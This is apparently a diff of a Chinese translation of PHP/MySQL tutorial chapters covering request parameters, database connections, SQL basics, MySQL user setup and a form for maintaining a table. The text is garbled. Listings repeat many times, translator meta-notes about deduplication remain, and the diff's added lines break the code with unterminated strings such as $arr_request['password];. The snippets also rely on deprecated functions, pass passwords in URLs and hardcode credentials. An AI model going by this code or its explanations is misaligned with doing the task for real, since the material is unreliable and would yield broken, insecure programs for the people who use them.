-
-如果你不熟悉 HTML，现在是学习的时候了。在书中，假设你了解 HTML，如果你不理解 HTML 表格和表单，你会很快迷路。
-
-## 开始
-
-每当我开始一个新项目时，我喜欢从一个新的空目录开始。在这种情况下，让我们称其为 `php_ch5`。当然，该目录需要位于 Web 服务器的根目录下。如果你是按照第 1 章中的说明安装的 PHP，Web 服务器的根目录是 `/usr/local/apache/htdocs`。接下来，我们将按照列表 5.1 所示创建 `menu.php` 文件，用于存放后端任务的菜单。
-
-### 列表 5.1 menu.php
-```php
-<?php require('common.inc');
-<?php header('Administrative Menu'); ?>
-<h1>Administrative Menu</h1>
-<ol>
-  <li><a href="connect.php">Create Database Connection</a></li>
-</ol>
-<?php footer() ?>
-```
-
-## 建立连接
-
-`common.inc` 文件包含了 `header` 和 `footer` 函数的定义。这些函数将在章节的稍后部分介绍。当点击“创建数据库连接”链接时，会执行 `connect.php`。该文件尝试连接你在第 2 章中安装的 MySQL 服务器。列表 5.2 显示了 `connect.php` 文件，它尝试使用 `root` 用户名和 `root` 密码连接到数据库。因为在安装 MySQL 时没有创建该用户名，所以连接注定会失败。然而，失败是可以避免的。列表 5.2 显示了...（此处省略重复的列表内容）
-
-```php
-<?php require('common.inc');
-<?php header('Administrative Menu'); ?>
-<h1>Administrative Menu</h1>
-<ol>
-  <li><a href="connect.php">Create Database Connection</a></li>
-</ol>
-<?php footer() ?>
-```
-
-（由于原始文本中存在大量重复的列表块，此处已根据要求进行清理，确保不重复原文）
-
-```php
-<?php require('common.inc');
-<?php header('Administrative Menu'); ?>
-<h1>Administrative Menu</h1>
-<ol>
-  <li><a href="connect.php">Create Database Connection</a></li>
-</ol>
-<?php footer() ?>
-```
-
-（注：原文提供的文本中包含了多次重复的 Listing 5.2 代码块，在译文中已根据“一定不要重复输出原文”的原则进行了去重处理。）
-
-
-
-
-你可以看到用户名和密码信息是通过 URL 传递的。问号字符 (`?`) 开始字段信息，而和符号字符 (`&`) 用于分隔字段。幸运的是，PHP 引擎会自动解析 URL 行。解析结果被放置在 `$HTTP_GET_VARS` 数组中。
-
-所谓的“陷阱”（如果你想考虑的话）是，你的脚本可以从多个位置获取信息——可以是 `$HTTP_GET_VARS` 数组或 `$HTTP_POST_VARS` 数组。
-
-我对这些（以及其他）陷阱的解决方案创建一个 `$arr_request` 数组，并用来自两个 `$HTTP` 数组的信息对其初始化。我在 `common.inc` 中使用以下代码初始化你的 `$arr_request` 数组：
-
-```
-// declare the request array which holds both
-// url-based (get) and form-based (post) parameters.
-$arr_request = array();
-
-// move the url and form parameters into the
-// request array. Form parameters supercede url
-// parameters. Additionally, all keys are converted
-// to lower-case.
-if (count($HTTP_GET_VARS)) {
-    while (list($key, $value) = each($HTTP_GET_VARS)) {
-        $arr_request[strtolower($key)] = $value;
-    }
-}
-if (count($HTTP_POST_VARS)) {
-    while (list($key, $value) = each($HTTP_POST_VARS)) {
-        $arr_request[strtolower($key)] = $value;
-    }
-}
-```
-
-如果你在所有的 PHP 脚本中包含了 `common.inc` 文件，那么你的脚本如何运行就无关了。所有传递的信息都会进入带有小写键的 `$arr_request` 数组。这意味着可以通过 `$arr_request['username']` 用户名信息。
-
-PHP 提供了 `$HTTP_GET_VARS` 和 `$HTTP_POST_VARS` 数组的替代方案。HTML 表单和基于 URL 的信息也可以作为 PHP 变量直接访问。例如，定义为 `<input type="input" name="last_name">` 字段的表单信息可以在你的 PHP 脚本中使用 `$last_name` 访问。同样，来自 URL 的信息（如 http://www.site.com?last_name=john）可以通过 `$last_name` 访问。然而，我仍然倾向于使用 `$arr_request` 数组，因为遍历所有传递给脚本的信息是有用的。如果这些信息在标量变量中，它们是无法遍历的。例如，将所有参数名称更改为大写可以确保 Shift 键的切换不会破坏你的脚本。或者你可能需要为了调试目的显示所有的脚本输入参数。
-
-本节对 CGI（或通用网关接口）协议提供了极其浅显的介绍。更多信息可以在附录 A“互联网资源”中列出的资源中找到。
-
-## 使用 HTML 表单信息
-
-现在你就可以轻松地从 PHP 脚本中访问表单信息了，是时候使用这些信息来建立数据库连接了。第一步是检查建立连接的代码。
-
-```
-$id_link = @mysql_connect('localhost', 'affy', 'affy');
-```
-
-在这一行代码中，用户名和密码是字符串字量。为了利用表单信息，这行代码需要更改为变量：
-
-```
-$id_link = @mysql_connect('localhost');
-$username;
-$password);
-```
-
-现在使用了变量，需要对它们进行初始化。以下代码执行了初始化：
-
-```
-if ( count($arr_request) {
-$username = $arr_request['username'];
-$password = $arr_request['password'];
-}
-else {
-$username = 'phpuser';
-$password = 'phpuser';
-}
-```
-
-# 第 05 章 / 间歇一：连接数据库
-
-当表单信息可用时，`count` 函数的结果大于 1，使得 `if` 语句执行真分支，从而从 `$arr_request` 数组中提取用户名和密码信息。
-
-当不存在表单信息时，用户名和密码仍然使用字符串字面量初始化。
-
-除了带有这两个字段的表单以及没有表单信息外，还有第三种可能性。如果 connect.php3 被一个没有用户名和密码字段的表单调用怎么办？如果是，这段代码将会失败。可以通过直接检查表单字段而不是依赖 `arr_request` 数组中的元素数量来使这段代码更健壮（即能够处理环境中的失败）。例如：
-
-```
-$username = $arr_request['username'];
-$password = $arr_request['password'];
-```
-
-```
-if (empty($username)) $username = 'phpuser';
-if (empty($password)) $password = 'phpuser';
-```
-
-因为 PHP 对未初始化的数组元素返回空字符串，上面的代码非常精简。将值从 `$arr_request` 复制到各个变量中。处理标量变量比使用数组变量更易读，且在某种程度上更高效。然后，如果其中任何一个变量为空——意味着表单未提供任何值——则提供默认值。
-
-列表 5.3 显示了经过这两处更改的 connect.php3 文件，以便你在文中查看它们。
-
-## 列表 5.3 修改后的 connect.php3
-
-```
-<?php require('common.inc'); ?>
-```
-
-```
-<?php
-$username = $arr_request['username'];
-$password = $arr_request['password'];
-```
-
-```
-<?php
-$username = $arr_request['username'];
-$password = $arr_request['password'];
-```
-
-```php
-if (empty($username)) $username = 'phpuser';
-if (empty($password)) $password = 'phpuser';
-```
-
-```
-$id_link = @mysql_connect('localhost');
-```
-
-```
-$id_link = @mysql_connect('localhost', 'affy', 'affy');
-```
-
-```php
-if count($arr_request) {
-$username = $arr_request['username'];
-$password = $arr_request['password'];
-}
-else {
-$username = 'phpuser';
-$password = 'phpuser';
-}
-```
 
 ```php
 $username = $arr_request['username'];
@@ -3154,7 +2696,7 @@ $password = $arr_request['password'];
 <?php require('common.inc'); ?>
 ```
 
-```
+```php
 <?php
 $username = $arr_request['username'];
 $password = $arr_request['password'];
@@ -3171,7 +2713,7 @@ if (empty($username)) $username = 'phpuser';
 if (empty($password)) $password = 'phpuser';
 ```
 
-```
+```php
 $id_link = @mysql_connect('localhost', 'affy', 'affy');
 ```
 
@@ -3199,7 +2741,7 @@ $password = $arr_request['password'];
 <?php require('common.inc'); ?>
 ```
 
-```
+```php
 <?php
 $username = $arr_request['username'];
 $password = $arr_request['password'];
@@ -3208,7 +2750,7 @@ $password = $arr_request['password'];
 ```php
 <?php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
@@ -3216,7 +2758,7 @@ if (empty($username)) $username = 'phpuser';
 if (empty($password)) $password = 'phpuser';
 ```
 
-```
+```php
 $id_link = @mysql_connect('localhost', 'affy', 'affy');
 ```
 
@@ -3237,23 +2779,23 @@ $password = 'phpuser';
 
 ```php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
 <?php require('common.inc'); ?>
 ```
 
-```
+```php
 <?php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
 <?php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
@@ -3261,7 +2803,7 @@ if (empty($username)) $username = 'phpuser';
 if (empty($password)) $password = 'phpuser';
 ```
 
-```
+```php
 $id_link = @mysql_connect('localhost', 'affy', 'affy');
 ```
 
@@ -3272,41 +2814,41 @@ $id_link = @mysql_connect('localhost');
 ```php
 if count($arr_request) {
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 }
 else {
 $username = 'phpuser';
-$password = 'phpuser';
+$password = 'phpuser;
 }
 ```
 
 ```php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
 <?php require('common.inc'); ?>
 ```
 
-```
+```php
 <?php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
 <?php
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 ```
 
 ```php
-if (empty($username) $username = 'phpuser';
-if (empty($password)) $password = 'phpuser';
+if (empty($username)) $username = 'phpuser';
+if (empty($password)) $password = 'phpuser;
 ```
 
-```
+```php
 $id_link = @mysql_connect('localhost', 'affy', 'affy');
 ```
 
@@ -3317,16 +2859,58 @@ $id_link = @mysql_connect('localhost');
 ```php
 if count($arr_request) {
 $username = $arr_request['username'];
-$password = $arr_request['password'];
+$password = $arr_request['password];
 }
 else {
 $username = 'phpuser';
-$password = 'phpuser';
+$password = 'phpuser;
 }
 ```
 
+```php
+$username = $arr_request['username'];
+$password = $arr_request['password];
+```
 
+```php
+<?php require('common.inc'); ?>
+```
 
+```php
+<?php
+$username = $arr_request['username'];
+$password = $arr_request['password];
+```
+
+```php
+<?php
+$username = $arr_request['username'];
+$password = $arr_request['password;
+```
+
+```php
+if (empty($username)) $username = 'phpuser';
+if (empty($password)) $password = 'phpuser;
+```
+
+```php
+$id_link = @mysql_connect('localhost', 'affy', 'affy');
+```
+
+```php
+$id_link = @mysql_connect('localhost');
+```
+
+```php
+if count($arr_request) {
+$username = $arr_request['username'];
+$password = $arr_request['password];
+}
+else {
+$username = 'phpuser';
+$password = 'phpuser;
+}
+```
 
 ## 从信息到数据库
 
@@ -3343,9 +2927,7 @@ $password = 'phpuser';
 
 所以，让我们描述一下上一节中使用的信息。首先，我们需要一个描述所有信息的描述性术语：
 
-```
-patient_names
-```
+`patient_names`
 
 这让我们从具体的（即名称）转向了通用的（所有信息）。下一步是描述与每个患者关联的信息：
 
@@ -3354,7 +2936,7 @@ name_first char(40)
 name_last char(40)
 ```
 
-在数据库术语中，每条信息被称为一列（column）或*字段*（field）。因此，每个患者都关联两个列名：name_first 和 name_last。所有列合在一起是一条记录（record）。所有记录合在一起就是一张表（table）：
+在数据库术语中，每条信息被称为一列（column）或*字段*（field）。因此，每个患者都关联两个列名：`name_first` 和 `name_last`。所有列合在一起是一条记录（record）。所有记录合在一起就是一张表（table）：
 
 | 表： | 患者姓名 |
 | :--- | :--- |
@@ -3417,8 +2999,11 @@ name_last char(40)
 SQL 最初由 IBM 开发，是一种通过委员会演进的语言。它由美国标准协会（ANSI）委员会控制。SQL 是一种极其强大且实用的语言。然而，尽管它功能强大，日常应用程序开发需要使用四个语句：
 
 - insert（向表插入数据）
+
 - update（修改表中的数据）
+
 - select（查询表）
+
 - delete（从表中删除数据）
 
 # SQL 简介
@@ -3426,7 +3011,9 @@ SQL 最初由 IBM 开发，是一种通过委员会演进的语言。它由美�
 使用 SQL 的所有功能还需要另外三个语句：
 
 - create（创建数据库表和其他项目）
+
 - alter（更改数据库表的定义）
+
 - drop（删除数据库表和其他项目）
 
 后续章节将展示如何使用 create、alter 和 drop SQL 语句操作数据库表。
@@ -3466,10 +3053,6 @@ mysql> # 告诉 mysql 使用 php_book 数据库
 mysql> 用于未来的 sql 语句。
 mysql> use php_book;
 ```
-
-
-
-
 
 # 数据库已更改
 
@@ -3670,7 +3253,7 @@ mysql> describe email_messages;
 
 9 rows in set (0.00 sec)
 
-describe 命令显示数据类型已从 integer 更改为 varchar(25)。alter table 语句显示了 2 条警告，这让你知道数据因截断而丢失。在更改任何表之前，创建数据库备份是一个非常好的主意。
+describe 命令显示数据类型已从 integer 更改为 varchar(25）。alter table 语句显示了 2 条警告，这让你知道数据因截断而丢失。在更改任何表之前，创建数据库备份是一个非常好的主意。
 
 当一个整数字段转换为 varchar(4) 字段时会发生什么？让你自己发现答案。只需按照上面的示例，相应地更改数据类型，并在 SQL insert 命令中插入数字（不带周围单引号）而不是文本。
 
@@ -3685,19 +3268,31 @@ describe 命令显示数据类型已从 integer 更改为 varchar(25)。alter ta
 ## 第 06 章 / 数据库与 SQL
 
 ```
+
 $ 连接到 mysql 程序。
+
 $ mysql -u root -password
+
 欢迎来到 MySQL 监控。命令以 : 或 \g 结束。
+
 mysql> use php_book;
+
 Database changed
+
 mysql> alter table email_messages drop column
+
 -> temp_field;
+
 Query OK, 0 rows affected (0.00 sec)
+
 Records: 0 Duplicates: 0 Warnings: 0
+
 ```
 
 ```mysql
+
 mysql> describe email_messages;
+
 ```
 
 | 字段 (Field) | 类型 (Type) | 空空 (Null) | 键 (Key) | 默认 (Default) |
@@ -3720,13 +3315,21 @@ mysql> describe email_messages;
 删除表甚至比删除字段更简单。只需要指定表名即可：
 
 ```
+
 $ 连接到 mysql 程序。
+
 $ mysql -u root -password
+
 欢迎来到 MySQL 监控。命令以 : 或 \g 结束。
+
 mysql> use php_book;
+
 Database changed
+
 mysql> drop table email_messages;
+
 Query OK, 0 rows affected (0.00 sec)
+
 ```
 
 如果你需要删除表中的记录而不是删除表本身，请使用 SQL delete 命令。
@@ -3740,11 +3343,17 @@ Query OK, 0 rows affected (0.00 sec)
 insert 语句向表中添加记录。其基本语法为
 
 ```sql
+
 insert into
+
 (table_name)
+
 (column_list)
+
 values
+
 (value_list)
+
 ```
 
 insert 语句中指定的所有字符串字面量必须用单引号括起来。value_list 部分中的值数量必须与 column_list 部分中的列数相等。
@@ -3752,21 +3361,33 @@ insert 语句中指定的所有字符串字面量必须用单引号括起来。v
 这里是 insert 语句的一个示例：
 
 ```mysql
+
 mysql> create table test (
+
 -> a integer,b VARCHAR(10)
+
 ->);
+
 mysql> insert into test
+
 -> (a, b)
+
 -> values
+
 -> (134, 'aaa');
+
 ```
 
 insert 语句的一种更高级的形式语法如下：
 
 ```sql
+
 insert into (table_name)
+
 (column_list)
+
 (select_statement)
+
 ```
 
 这种语法允许你从一个或多个表选择信息并在一个语句中插入到新表中。不过，我们将在第 14 章“真实世界的 SQL”中详细讨论 select 语句。
@@ -3776,48 +3397,79 @@ insert into (table_name)
 update 语句更改表中的信息。其基本语法为
 
 ```sql
+
 update (table_name)
+
 set (column_name) = (expression)...
+
 where (where_clause)
+
 ```
 
 ## update 语句最常用的用途之一是增加记录中的字段，看起来可能如下：
 
 ```mysql
+
 mysql> create table test (a integer);
+
 mysql> insert into test (a) values (134);
+
 mysql> insert into test (a) values (100);
+
 mysql> select * from test;
+
 +------+
+
 | a |
+
 +------+
+
 | 134 |
+
 | 100 |
+
 +------+
+
 mysql> update test set a = a + 1;
+
 Query OK, 2 rows affected (0.00 sec)
+
 Rows matched: 2 Changed: 2 Warnings: 0
+
 mysql> select * from test;
+
 +------+
+
 | a |
+
 +------+
+
 | 135 |
+
 | 101 |
+
 +------+
+
 ```
 
 注意，两条记录都通过同一个 update 语句更改了。事实上，该 update 语句旨在更新表中的每条记录。这种行为在你需要执行全局更新时非常有用。例如，给所有员工增加 15% 的薪水时：
 
 ```sql
+
 update employees set salary = salary * 1.15;
+
 ```
 
 当然，你无法负担每年给每个人加薪的费用。对于那些困难的年份，你需要一个带有 where 子句的 update 语句。
 
 ```sql
+
 update employees
+
 set salary = salary * 1.15
+
 where last_name = 'Smith';
+
 ```
 
 > 使用 update 语句时，必须用单引号括围字符串字面量。
@@ -3825,7 +3477,9 @@ where last_name = 'Smith';
 MySQL 有许多函数，所有函数都可以用于 update 语句的表达式部分。例如，为了确保字段中的所有信息都使用大写字母，如：
 
 ```sql
+
 update employees set last_name = upper(last_name);
+
 ```
 
 ## SQL简介
@@ -3835,12 +3489,19 @@ update employees set last_name = upper(last_name);
 select 命令从表中选择记录。其基本语法为
 
 ```sql
+
 select (field_list)
+
 from (table_list)
+
 where (where_clause)
+
 group by (column_list)
+
 order by (column_list)
+
 having (having_clause)
+
 ```
 
 select 语句是目前 SQL 中是最复杂的。然而，它也可以非常简单，因为 where、group by 和 having 子句是可选的。
@@ -3850,8 +3511,11 @@ select 语句是目前 SQL 中是最复杂的。然而，它也可以非常简�
 select 语句的最基本形式是
 
 ```sql
+
 SELECT *
+
 FROM table;
+
 ```
 
 记录结果集：
@@ -3864,10 +3528,15 @@ FROM table;
 如果你只需要特定的字段，select 语句可能如下：
 
 ```sql
+
 SELECT
+
 str_name_first,int_age
+
 FROM
+
 table;
+
 ```
 
 记录结果集：
@@ -3880,12 +3549,19 @@ table;
 该语句从表中的所有记录中选择姓和年龄字段。可以使用许多函数来操纵结果集中信息的格式化方式。我喜欢使用的一个技巧是直接将 HTML 标签放入结果集中。例如：
 
 ```sql
+
 SELECT
+
 CONCAT(CONCAT(CONCAT(CONCAT(
+
 '<option value="', int_age,
+
 '">',str_name_first),
+
 ',',str_name_last), '</option>'))
+
 FROM table;
+
 ```
 
 记录结果集：
@@ -3906,16 +3582,27 @@ FROM table;
 你可以使用 AS 关键字为字段提供别名。以下示例为表中 50 岁以上的人生成 option 标签，展示了如何实现：
 
 ```sql
+
 SELECT
+
 CONCAT(CONCAT(CONCAT(CONCAT(
+
 '<option value="', int_age,
+
 '">',str_name_first),
+
 ',',str_name_last), '</option>') AS item
+
 FROM table
+
 WHERE
+
 int_age > 50
+
 ORDER BY
+
 int_age;
+
 ```
 
 记录结果集：
@@ -3928,11 +3615,15 @@ int_age;
 AS 关键字在使用计算列时非常有用。在处理来自多个表的结果集且字段名不相同时也非常有用。例如：
 
 ```sql
+
 SELECT fname as str_name_first
+
 FROM table;
 
 SELECT str_name_first
+
 FROM table;
+
 ```
 
 得益于 AS 关键字，可以使用相同的 PHP 代码处理这些语句的结果集，因为字段名是相同的。
@@ -3948,11 +3639,17 @@ from 子句列出了提供信息的表。目前，我们只从一个表选择信
 当你需要比“选择所有记录”更精细时，使用 where 子句。例如：
 
 ```sql
+
 SELECT
+
 str_name_first,int_age
+
 FROM table
+
 WHERE
+
 UPPER(str_name_first) LIKE 'F%'
+
 ```
 
 记录结果集：
@@ -3968,14 +3665,23 @@ UPPER(str_name_first) LIKE 'F%'
 # SQL 简介
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   int_age
+
 FROM
+
   select01
+
 WHERE
+
   UPPER(str_name_first) LIKE 'F%'
+
 OR UPPER(str_name_first) LIKE 'G%';
+
 ```
 
 ## 结果集：
@@ -3986,14 +3692,23 @@ OR UPPER(str_name_first) LIKE 'G%';
 你也可以使用 AND 运算符来连接表达式。例如，查找所有名字以 F 开头且年龄超过 65 岁的人：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   int_age
+
 FROM
+
   select01
+
 WHERE
+
   UPPER(str_name_first) LIKE 'F%'
+
 AND int_age > 65;
+
 ```
 
 ## 结果集：
@@ -4019,13 +3734,21 @@ AND int_age > 65;
 order by 子句允许你根据字段对 select 语句的结果进行排序，可以是升序或降序。例如，以下 SQL 语句按名字从 A 到 Z 升序排序：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   int_age
+
 FROM
+
   select01
+
 ORDER BY
+
   str_name_first;
+
 ```
 
 ## 结果集：
@@ -4037,13 +3760,21 @@ ORDER BY
 DESC 关键字（descending 的缩写）可以用于从 Z 到 A 排序，如下：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   int_age
+
 FROM
+
   select01
+
 ORDER BY
+
   str_name_first DESC;
+
 ```
 
 # SQL 简介
@@ -4068,13 +3799,21 @@ ORDER BY
 MySQL 手册对聚合函数的描述得很好，因此我在这里不列出它们。然而，一些示例将有助于聚合的概念。首先，让我们看看有多少人拥有同一个名字：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   count(*)
+
 FROM
+
   select01
+
 GROUP BY
+
   str_name_first;
+
 ```
 
 ## 结果集：
@@ -4086,13 +3825,21 @@ GROUP BY
 你也可以找到每个名字的最大年龄：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   MAX(int_age) AS OLDEST_PERSON
+
 FROM
+
   select01
+
 GROUP BY
+
   str_name_first;
+
 ```
 
 结果集：
@@ -4108,15 +3855,25 @@ having 子句允许根据聚合函数的结果来过滤返回的记录。它只�
 在上一节中，你看到一个确定每个名字组最大年龄的查询。该查询显示最老的 Charles 是 10 岁，最老的 Florence 是 86 岁。如果你需要进一步完善查询，仅列出超过 65 岁的最大年龄，它可能如下：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   MAX(int_age) AS OLDEST_PERSON
+
 FROM
+
   select01
+
 GROUP BY
+
   str_name_first
+
 HAVING
+
   OLDEST_PERSON > 65;
+
 ```
 
 结果集：
@@ -4131,13 +3888,21 @@ HAVING
 这个查询并不是 having 子句的良好示例，因为它是不高效的。在记录被聚合且所有虚拟列计算完毕后，having 子句才起作用。由于记录被聚合，having 子句可以过滤结果。例如，如果你需要过滤特定的记录，应该使用 where 子句。以下 SQL 语句过滤了所有：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   count(*)
+
 FROM
+
   str_name_first
+
 GROUP BY
+
   str_name_first;
+
 ```
 
 结果集：
@@ -4149,13 +3914,21 @@ GROUP BY
 你你也可以找到每个名字的最大年龄：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   MAX(int_age) AS OLDEST_PERSON
+
 FROM
+
   select01
+
 GROUP BY
+
   str_name_first;
+
 ```
 
 结果集：
@@ -4171,15 +3944,25 @@ having 子句允许根据聚合函数的结果来过滤返回的记录。它只�
 在上一节中，你看到一个确定每个名字组最大年龄的查询。该查询显示最老的 Charles 是 10 岁，最老的 Florence 是 86 岁。如果你需要进一步完善查询，仅列出超过 65 岁的最大年龄，它可能如下：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   MAX(int_age) AS OLDEST_PERSON
+
 FROM
+
   select01
+
 GROUP BY
+
   str_name_first
+
 HAVING
+
   OLDEST_PERSON > 65;
+
 ```
 
 结果集：
@@ -4194,13 +3977,21 @@ HAVING
 这个查询并不是 having 子句的良好示例，因为它是不高效的。在记录被聚合且所有虚拟列计算完毕后，having 子句才起作用。由于记录被聚合，having 子句可以过滤结果。例如，如果你需要过滤特定的记录，应该使用 where 子句。以下 SQL 语句过滤了所有：
 
 ```sql
+
 SELECT
+
   str_name_first,
+
   count(*)
+
 FROM
+
   str_name_first
+
 GROUP BY
+
   str_name_first;
+
 ```
 
 结果集：
@@ -4214,32 +4005,51 @@ GROUP BY
 delete 命令从表中表中删除记录。其语法为：
 
 ```sql
+
 DELETE
+
 FROM
+
   (table_name)
+
 WHERE
+
   (where_clause);
+
 ```
 
 delete 命令是非常危险的。如果不提供 where 子句，所有记录将被删除。因此，如果你想删除特定的记录，应该使用 where 子句。例如，以下 SQL 语句删除了 select01 中所有的 Charles：
 
 ```sql
+
 DELETE
+
 FROM
+
   select01
+
 WHERE
+
   UPPER(str_name_first) = 'CHARLES';
+
 ```
 
 如果你需要验证记录是否已删除，请使用 select 语句：
 
 ```sql
+
 SELECT
+
   COUNT(*)
+
 FROM
+
   select01
+
 WHERE
+
   UPPER(str_name_first) = 'CHARLES';
+
 ```
 
 结果集：
@@ -4258,8 +4068,11 @@ WHERE
 尽管索引非常重要，但计算机速度非常快，需要数千条记录才能感觉到速度的提升。所以，至少目前，不必为你的数据库创建索引。找到更深入探讨索引的书籍或教程，并在需要时使用 alter table 命令添加。例如，以下 SQL 语句为 select0 表中的 int_age 字段创建一个索引：
 
 ```sql
+
 ALTER TABLE select0
+
 CHANGE COLUMN int_age INTEGER PRIMARY KEY;
+
 ```
 
 # 使用 AUTO_INCREMENT 创建键
@@ -4276,33 +4089,51 @@ CHANGE COLUMN int_age INTEGER PRIMARY KEY;
 
 
 ```sql
+
 CREATE TABLE autoi (
+
 key_autoi INTEGER AUTO_INCREMENT PRIMARY KEY,
+
 str_name_first VARCHAR(50)
+
 );
+
 ```
 
 既然表已经定义了自动递增字段，你现在插入记录时只需要指定名字即可：
 
 ```sql
+
 INSERT INTO autoi
+
 (str_name_first)
+
 VALUES
+
 ('David');
+
 ```
 
 ```sql
+
 INSERT INTO autoi
+
 (str_name_first)
+
 VALUES
+
 ('John');
+
 ```
 
 为了确定 `key_autoi` 字段的值，请使用 `last_insert_id()` 函数：
 
 ```sql
+
 SELECT DISTINCT last_insert_id()
+
 FROM autoi;
+
 ```
 
 结果记录集：
@@ -4338,7 +4169,7 @@ FROM autoi;
 
 根据我的经验，SQL `select` 语句是最常用的语句。它的六个子句（select, from, where, group by, order by, and having）使其变得最复杂，如下：
 
-- `select` 子句指定了查询返回哪些字段。此外，你可以使用表达式创建虚拟或计算字段。
+- `select` 子句指定了查询返回哪些字段。此外，你可以使用表表达式创建虚拟或计算字段。
 - `from` 子句指定了查询查看哪些表。
 - 可选的 `where` 子句指定了从哪些记录获取信息。例如，如果你的查询只涉及房屋，那么任何与汽车相关的记录都会被忽略。
 - 可选的 `group` 子句指定了如何聚合返回的记录。如果你按性别字段进行聚合，结果查询将最多只有两条记录（假设你的表引用的是智人）。
@@ -4364,18 +4195,22 @@ FROM autoi;
 - 支持“显示记录”功能——该功能应该调用一个可以根据不同表修改的显示程序。
 - 支持“删除记录”功能——应用程序应该将要删除的记录标记为删除。应用程序还应该能够撤销操作。
 - 支持“编辑记录”功能——该功能与显示功能一样，应该调用一个可以根据不同表修改的编辑程序。
-- 支持“克隆记录”功能——该功能从现有记录复制信息并允许用户修改新记录。
+- 支持“克隆记录”功能——该功能从现有记录复制信息并允用户修改新记录。
 
 # 创建连接代码
 
 如果你查看第 5 章创建的脚本，你会发现连接数据库的实际工作是通过一行完成的。因此，在 `common.inc` 中添加连接代码只需要在文件顶部添加以下几行：
 
 ```php
+
 $hostname = 'localhost';
+
 $username = 'phpuserser';
+
 $password = 'phpuserser';
 
 $id_link = @mysql_connect($hostname, $username, $password);
+
 ```
 
 从现在起，每次执行 PHP 脚本（只要它包含了 `common.inc`）都会建立数据库连接。
@@ -4385,11 +4220,12 @@ PHP 提供了一个名为 `mysql_pconnect` 的函数，可以在应用程序和�
 在你修改 `common.inc` 文件时，让我们添加本章剩余部分将讨论的数据库和表的变量：
 
 ```php
+
 $dbname = 'php_book';
+
 $tablename = 'english_month_names';
+
 ```
-
-
 
 
 
@@ -4398,53 +4234,99 @@ $tablename = 'english_month_names';
 数据库已更改
 
 ```mysql
+
 mysql> # 创建具有有限权限的用户。
+
 mysql> INSERT INTO
+
   -> user
+
   -> (
+
     -> .host
+
     -> .user
+
     -> .password
+
     -> .select_priv
+
     -> .insert_priv
+
     -> .update_priv
+
     -> .delete_priv
+
   )
+
   -> VALUES (
+
     -> 'localhost'
+
     -> '.phpuser'
+
     -> .password('phpuser')
+
     -> 'Y'
+
     -> 'Y'
+
     -> 'Y'
+
     -> 'Y'
+
   );
+
 Query OK, 1 row affected (0.00 sec)
+
 ```
 
 ```mysql
+
 mysql> #  MySQL phpuser 可以访问哪个数据库。
+
 mysql> INSERT INTO
+
   -> db
+
   -> (
+
     -> .host
+
     -> .db
+
     -> .user
+
     -> .select_priv
+
     -> .insert_priv
+
     -> .update_priv
+
     -> .delete_priv
+
   )
+
   -> VALUES (
+
     -> '%'
+
     -> .php_book
+
     -> .phpuser
+
     -> 'Y'
+
     -> 'Y'
+
     -> 'Y'
+
     -> 'Y'
+
   );
+
 mysql> exit
+
 ```
 
 再见
@@ -4452,9 +4334,13 @@ mysql> exit
 ## 创建数据库表
 
 ```bash
+
 $ 强制 MySQL 重新加载权限表。
+
 $ /usr/local/mysql/bin/mysqladmin -u root -p reload
+
 Enter Password: <输入你的 MySQL root 密码>
+
 ```
 
 按照这些步骤操作后，phpuser 已创建并准备好使用。
@@ -4476,25 +4362,41 @@ Enter Password: <输入你的 MySQL root 密码>
 可以使用以下步骤在 php_book 数据库中创建 english_month_names 表：
 
 ```bash
+
 $ mysql -u phpuser -p
+
 Enter password: phpuser
+
 mysql> use php_book;
+
 Database changed
+
 mysql> CREATE TABLE english_month_names (
+
 -> key_english_month_names int(10)
+
 -> unsigned DEFAULT '0' NOT NULL auto_increment,
+
 ```
 
 ## 第 07 章 / 间歇：二：维护列表
 
 ```sql
+
 -> dte_created datetime DEFAULT '0000-00-00 00:00:00'
+
 NOT NULL,
+
 -> dte_updated datetime DEFAULT '0000-00-00 00:00:00'
+
 NOT NULL,
+
 -> flg_deleted enum('Y','N') DEFAULT 'N' NOT NULL,
+
 -> str_month_name varchar(50) NOT NULL,
+
 -> PRIMARY KEY (key_english_month_names);
+
 ```
 
 ERROR 1044: Access denied for user: 'phpuser@localhost' to database 'php_book'
@@ -4523,26 +4425,43 @@ ERROR 1044: Access denied for user: 'phpuser@localhost' to database 'php_book'
 列表 7.1 english_month_names.php3 实现第一步（插入表单）
 
 ```php
+
 <?php
+
 // 指定要维护的表。
+
 $table_name = 'english_names';
+
 require('common.inc');
+
 affy_header("维护: $table_name");
+
 ?>
+
 ```
 
 ```html
+
 <H1>维护：&nbsp;
+
 <font color="green"><?php echo $table_name; ?>
+
 </font>
+
 </H1>
+
 ```
 
 ```php
+
 <?php
+
 require($table_name . '_insert.inc');
+
 affy_footer();
+
 ?>
+
 ```
 ![img/insert_form.png](img/insert_form.png) 图 7.1 插入表单。
 
@@ -4557,12 +4476,19 @@ affy_footer();
 **列表 7.2** english_names_insert.inc
 
 ```html
+
 <form action="<?php echo $_SELF; ?>" method="insert">
+
 <input type="hidden" name="action" value="insert">
+
 月份&nbsp;
+
 <input type="text" name="str_month_name">
+
 <input type="submit" value="添加">
+
 </form>
+
 ```
 
 用户填写表单并点击添加后，表单信息将发送到 action 属性指定的脚本。注意上面的表单使用了 $_SELF 变量。该变量由 PHP 引擎初始化，包含执行脚本的名称。
